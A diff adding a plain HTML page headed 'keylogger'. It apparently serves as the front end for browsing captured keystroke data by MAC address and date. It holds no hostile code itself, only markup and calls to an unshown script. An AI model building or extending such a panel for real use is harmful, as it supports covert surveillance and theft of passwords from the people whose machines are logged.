@@ -1,0 +1,54 @@
+<!DOCTYPEhtml>
+<html>
+<head>
+    <title>Anonimous</title>
+    <meta charset="UTF-8">
+    <link href="design.css" rel="stylesheet">
+</head>
+
+<body>
+    <div id="for_h1" align="center">
+        <h1 align="center" >keylogger</h1>
+    </div>
+    <script src="html_script.js"></script>
+
+<br><br>
+    <div>
+        <label for="macs_list" id="label_for_macs_list">mac addresses:</label>
+        <p id="macs_list"></p>
+    </div>
+
+    <div align="center">
+        <label for="mac_input" id="label_for_mac">Enter mac address</label>
+        <input type="text" id="mac_input" placeholder="ff:ff:ff:ff:ff:ff" required minlength="17">
+    </div>
+
+    <div align="center">
+        <button id="search_mac_button" onclick="get_by_mac()" >search </button>
+    </div>
+
+<br>
+
+    <div align="center" >
+        <label for="date_options">select date </label>
+        <select id="date_options"></select>
+    </div>
+    <div align="center">
+        <button id="search_date_button" onclick="get_by_date()" >search </button>
+    </div>
+
+
+<br><br>
+
+
+
+<div>
+    <p id="data"></p>
+</div>
+
+</body>
+<br>
+
+
+
+</html>
